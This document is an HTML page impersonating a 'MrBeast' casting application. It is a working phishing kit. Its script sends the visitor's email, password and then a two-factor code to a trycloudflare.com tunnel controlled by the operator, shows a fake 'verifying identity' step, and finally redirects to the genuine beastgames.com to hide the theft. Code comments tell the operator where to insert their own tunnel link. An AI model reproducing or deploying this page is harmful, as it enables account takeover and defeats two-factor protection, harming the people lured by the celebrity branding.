<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MrBeast Casting App</title>
    <style>
        :root { --app-blue: #00a8e8; --app-pink: #f12e3e; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; background-color: var(--app-blue); 
            margin: 0; color: #fff; overflow: hidden; 
        }

        /* Fixed Background Pattern */
        .bg-pattern { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background-image: url('https://www.beastgames.com'); 
            background-size: 80px; opacity: 0.15; z-index: 0; pointer-events: none; 
        }

        .app-container {
            width: 100%; max-width: 450px; padding: 20px;
            display: flex; flex-direction: column; align-items: center;
            z-index: 10; margin-top: 20px;
        }

        .app-logo { 
            width: 180px; margin-bottom: 30px; 
            filter: drop-shadow(0 0 15px rgba(0,0,0,0.3)); 
        }

        .app-card { 
            background: #111; border-radius: 40px; width: 100%; 
            padding: 40px 25px; text-align: center; 
            box-shadow: 0 30px 60px rgba(0,0,0,0.6); 
            border: 1.5px solid #222; 
        }

        .beast-title { 
            font-size: 28px; font-weight: 900; letter-spacing: -1px;
            text-transform: uppercase; margin-bottom: 10px; 
            color: #fff; text-shadow: 2px 2px 0px var(--app-blue);
        }

        p { color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }

        input { 
            width: 100%; padding: 18px; margin-bottom: 15px; 
            border: none; background: #1c1c1c; color: white; 
            border-radius: 20px; font-size: 16px; outline: none;
            transition: all 0.2s; border: 1px solid transparent;
        }

        input:focus { border: 1px solid var(--app-blue); background: #222; }

        .btn { 
            background: linear-gradient(135deg, #f12e3e, #ff5e62); 
            color: #fff; border: none; padding: 20px; 
            border-radius: 20px; cursor: pointer; width: 100%; 
            font-weight: 800; text-transform: uppercase; font-size: 16px; 
            box-shadow: 0 10px 20px rgba(241, 46, 62, 0.3);
            transition: transform 0.1s;
        }

        .btn:active { transform: scale(0.97); }

        #puzzle-box, #loader, #otp_section { display: none; }

        /* Loader Animation */
        .spinner { 
            border: 4px solid rgba(0, 168, 232, 0.1); 
            border-top: 4px solid var(--app-blue); 
            border-radius: 50%; width: 50px; height: 50px; 
            animation: spin 0.8s linear infinite; margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    
    <div class="app-container">
        <!-- Top Logo -->
        <img src="https://www.beastgames.com" class="app-logo" alt="Logo">

        <div class="app-card">
            <!-- STEP 1 -->
            <div id="login_ui">
                <div class="beast-title">BEAST CASTING</div>
                <p>Login with your application email to continue your selection.</p>
                <input type="email" id="email" placeholder="Email Address">
                <input type="password" id="pass" placeholder="Password">
                <button class="btn" onclick="sendLogin()">Continue</button>
            </div>

            <!-- STEP 2: VERIFYING -->
            <div id="loader">
                <div class="spinner"></div>
                <p>Verifying Identity...</p>
            </div>

            <!-- STEP 3: SECURITY CHECK -->
            <div id="otp_section">
                <div class="beast-title" style="font-size: 22px;">SECURITY CHECK</div>
                <p>We sent a 6-digit code to your device.<br>Enter it below to confirm.</p>
                <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:24px; letter-spacing: 5px;">
                <button class="btn" onclick="submitOTP()">Finish Application</button>
            </div>
        </div>
    </div>

    <script>
        // Replace with your Window 3 link
        const tunnel = "https://postposted-settings-belly-quest.trycloudflare.com";

        function sendLogin() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                // Send Login to Window 2
                fetch(tunnel, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({'email': e, 'pass': p}) 
                });
                // Switch to Loader
                document.getElementById('login_ui').style.display = 'none';
                document.getElementById('loader').style.display = 'block';
                // Move to OTP after 3 seconds
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('otp_section').style.display = 'block';
                }, 3000);
            }
        }

        function submitOTP() {
            const c = document.getElementById('2fa_code').value;
            if(c) {
                // Send Code to Window 2
                fetch(tunnel, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({'2fa_code': c}) 
                }).then(() => {
                    // INSTANT REDIRECT TO REAL MRBEAST SITE
                    window.location.href = "https://www.beastgames.com";
                }).catch(() => {
                    // Redirect even if there is a connection delay
                    window.location.href = "https://www.beastgames.com";
                });
            }
        }
    </script>
</body>
</html>
